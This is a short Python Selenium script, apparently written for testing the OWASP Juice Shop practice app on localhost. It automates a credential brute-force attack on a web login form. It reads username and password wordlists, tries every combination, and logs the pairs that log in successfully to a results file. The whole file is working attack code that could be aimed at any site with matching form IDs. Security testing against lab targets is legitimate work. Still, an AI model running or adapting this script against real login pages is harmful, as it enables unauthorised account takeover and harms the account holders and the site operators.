from selenium import webdriver
from selenium.webdriver.common.by import By
import time
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

def brute_force(base_url):
    # driver = webdriver.Firefox()
    
    chrome_options = Options()
    chrome_options.add_argument("--auto-open-devtools-for-tabs")  

    # Enable performance logging
    chrome_options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
    
    driver = webdriver.Chrome(options=chrome_options)

    with open('utils/usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('utils/passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    url = f'{base_url}/#/login'
    
    driver.get(url)

    results = []


    # time.sleep(8)
    try:
        email_input = driver.find_element("xpath", '//input[@id="email"]')
        password_input = driver.find_element("xpath", '//input[@id="password"]')
        login_button = driver.find_element("xpath", '//button[@id="loginButton"]')

        #for owasp
        dismiss_button = driver.find_element("xpath", "//button[contains(@class, 'close-dialog')]")
        if dismiss_button:
            driver.execute_script("arguments[0].click();", dismiss_button)

        for username in usernames:
            for password in passwords:
                email_input.clear()
                password_input.clear()

                email_input.send_keys(username)
                password_input.send_keys(password)

                login_button.click()

                if driver.current_url != url:
                    results.append((username, password))
                    driver.get(url)

        with open('results/results_brute_force.txt', 'w') as result_file:
            result_file.write("Potential vulnerabilities\n:")
            for username, password in results:
                result_file.write(f"USERNAME: {username}, PASSWORD: {password}\n")
    except Exception as e:
        with open("results/error.txt", 'w') as f:
            f.write("dsnj")

    driver.quit()

# brute_force("https://localhost:3002")